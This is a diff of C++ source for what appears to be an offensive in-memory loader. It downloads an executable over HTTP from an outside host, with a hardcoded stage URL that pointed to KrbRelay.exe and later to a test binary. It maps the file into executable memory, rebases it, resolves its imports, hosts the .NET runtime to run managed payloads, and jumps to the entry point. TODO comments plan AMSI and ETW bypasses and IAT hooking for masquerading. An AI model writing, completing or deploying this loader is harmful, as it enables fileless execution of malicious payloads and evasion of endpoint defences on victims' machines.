@@ -16,6 +16,14 @@
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
 		rename("or", "InteropServices_or") // rename so c# symbols do not overwrite C++ functions/symbols
 
+// TODO: IAT hooking for arguments for both current process(affects CLR) and native loader
+// TODO: more testing on rebasing, use FIXED in compilation, or set fixed load address in virtualalloc
+// TODO: native exit function exits out of current process, hook this and fix
+// TODO: AMSI bypass before loading managed
+// TODO: ETW bypass 
+// TODO: implement [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
+// TODO: parse headers and allocate straight from HTTP download 
+
 // download file from url, returns buffer to file
 char* httpStage(LPCSTR urlStr,size_t &out_size) {
 	URL_COMPONENTSA urlComp;
@@ -112,9 +120,15 @@ char* httpStage(LPCSTR urlStr,size_t &out_size) {
 		fileSize += dwFileSize;
 	}
 	
+	// close handles
 	InternetCloseHandle(hHttpFile);
 	InternetCloseHandle(hConnect);
 	InternetCloseHandle(hSession);
+
+	// free mem
+	delete urlHostname;
+	delete urlPath;
+	delete httpBuffer;
 
 	out_size = fileSize;
 
@@ -143,18 +157,17 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 	IMAGE_DATA_DIRECTORY relocations = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)peImageBase;
 	// rebase/patch each absolute address in relocation table .reloc in allocated memory (patching only needed if image is not written to perferred address)
-	// TODO: [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
 	DWORD relocationsProcessed = 0;
 	while (relocationsProcessed < relocations.Size) {
 		// get relocation block header
 		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
-		// add size of block header
-		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
-
 		// calculate number of entries in relocation block
 		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+
+		// add size of block header
+		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
 		// get first entry in relocation block
-		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationBlock);
+		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
 		// patch each relocation entry
 		for (DWORD i = 0; i < relocationsCount; i++) {
 			// add size of entry
@@ -179,8 +192,8 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 }
 
 // import libraries, add function addresses to IAT, and hook commandline functions for masqurading
-DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
-	// resolve import address table
+DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, bool resolve) {
+	// resolve import address table for current process
 	IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 	// get first import descriptor in IAT
 	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
@@ -191,34 +204,48 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) 
 	while (importDescriptor->Name != NULL) {
 		// get library name and load into current process
 		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)peImageBase;
+		// note: full module PEs are loaded into process memory, export and import tables for specific module can also be read, not just current process
 		library = LoadLibraryA(libraryName);
 
 		// resolve/find all thunks(function addresses/ordinals) and write then to importDescriptor
 		if (library) {
-			PIMAGE_THUNK_DATA thunk = NULL;
+			// get first thunk(function) for import dll in current process
+			PIMAGE_THUNK_DATA thunk = NULL, originalThunk = NULL;
 			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peImageBase + importDescriptor->FirstThunk);
+			// contains original RVA unchanged by resolving/loading (so function name and ordinals can be still be retrieved after resolve/load)
+			originalThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peImageBase + importDescriptor->OriginalFirstThunk); 
 
 			// loop over thunks in import descriptor
 			while (thunk->u1.AddressOfData != NULL && (int)thunk != 0x0000ffff) {
 				// check if function is exported in dll by ordinal or by name(address) and add to IAT
+				// if DLL compiled with export ordinals(.def file), PIMAGE_IMPORT_BY_NAME cannot be cast since the AddressOfData is set to (ordinal number & 0x80000000)
+				// exports will still have names defined in export data directory, unless defined as NONAME in .def file
 				// https://docs.microsoft.com/en-us/cpp/build/exporting-functions-from-a-dll-by-ordinal-rather-than-by-name?view=msvc-170
-				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
-					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
-					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
-					// debugging print
-					printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
+				if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
+					if (resolve) {
+						// resolve function address
+						LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
+						thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
+
+
+						// debugging print
+						printf("resolving function(ord) %d -> %x\n", thunk->u1.Ordinal, thunk->u1.Function);
+					}
 				} else {
-					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peImageBase + thunk->u1.AddressOfData);
-					char* func_name = (char*)&(functionName->Name);
+					if (resolve) {
+						// resolve function address
+						PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peImageBase + originalThunk->u1.AddressOfData);
+						char* func_name = (char*)&(functionName->Name);
+						DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
+						thunk->u1.Function = functionAddress;
 
-					// TODO: finish commandline argument hooking
-
-					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, func_name);
-					thunk->u1.Function = functionAddress;
-					// debugging print
-					printf("resolving function %s -> %x\n", functionName->Name, functionAddress);
+						// debugging print
+						printf("resolving function %s -> %x\n", functionName->Name, functionAddress);
+					}
 				}
+
 				thunk++;
+				originalThunk++;
 			}
 		}
 		importDescriptor++;
@@ -236,7 +263,7 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) 
 DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** argv) {
 	// get image size
 	SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
-	// get preferred base address
+	// get preferred base address, usually always 0x40000000 in .exe PE files
 	LPVOID preferredAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
 
 	// unmap image base if it has been previously mapped
@@ -245,8 +272,11 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
 	// try to alloc memory for image at preferred address
-	// TODO: allocate during HTTP download
-	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	// debugging rebase
+	LPVOID peImageBase = VirtualAlloc((LPVOID)0x02f10000, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
 	// if allocation not possible at preferred address, allocate anywhere
 	if (!peImageBase) {
 		peImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -278,7 +308,7 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 	}
 
 	// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
-	if (resolveImportAddressTable(peImageBase, ntHeader)) {
+	if (resolveImportAddressTable(peImageBase, ntHeader, true)) {
 		printf("[!] imports cannot be resolved");
 		return 1;
 	}
@@ -287,12 +317,11 @@ DWORD loadNative(char* peBuffer, IMAGE_NT_HEADERS* ntHeader, int argc, char** ar
 	size_t entryAddr = (size_t)(peImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
 	((void(*)())entryAddr)();
 
+	// free memory
+	VirtualFree(peImageBase, imageSize, MEM_RELEASE);
+
 	return 0;
 }
-
-// TODO: use CLRCreateInstance and ICLRRuntimeInfo to start initialize COM in .NET 4
-// TODO: AMSI bypass before loading
-// TODO: ETW bypass
 
 // initialize Common Language Runtime depending on versions available
 // https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/hosting-interfaces
@@ -485,6 +514,7 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 		return res;
 	}
 
+	// stop CLR
 	cLRHost->Stop();
 
 	// free mem
@@ -526,23 +556,32 @@ DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 	return 0;
 }
 
-int main(int argc, char** argv)
+int main(int argc, char* argv[])
 {
-	//if (argc < 2) {
-	//	printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
-	//	return 0;
-	//}
-	LPCSTR url = "http://192.168.72.1:8000/KrbRelay.exe";
+	if (argc < 2) {
+		printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
+		return 0;
+	}
+	// Debugging
+	argv[1] = (char*)"http://192.168.72.1:8000/TestAppNative.exe";
 
 	// download PE from url
 	size_t peSize;
-	char* peBuffer = httpStage(url, peSize);
+	char* peBuffer = httpStage(argv[1], peSize);
 	if (peBuffer == NULL) {
 		printf("[!] HTTP request failed");
 		return 1;
 	}
 
+	argc--;
+	for (int i = 1; i < argc; i++) {
+		argv[i] = argv[i + 1];
+	}
+
 	// call reflectiveLoader
 	reflectiveLoadPE(peBuffer, peSize, argc, argv);
+
+	// free httpStage allocated mem
+	free(peBuffer);
 }
 
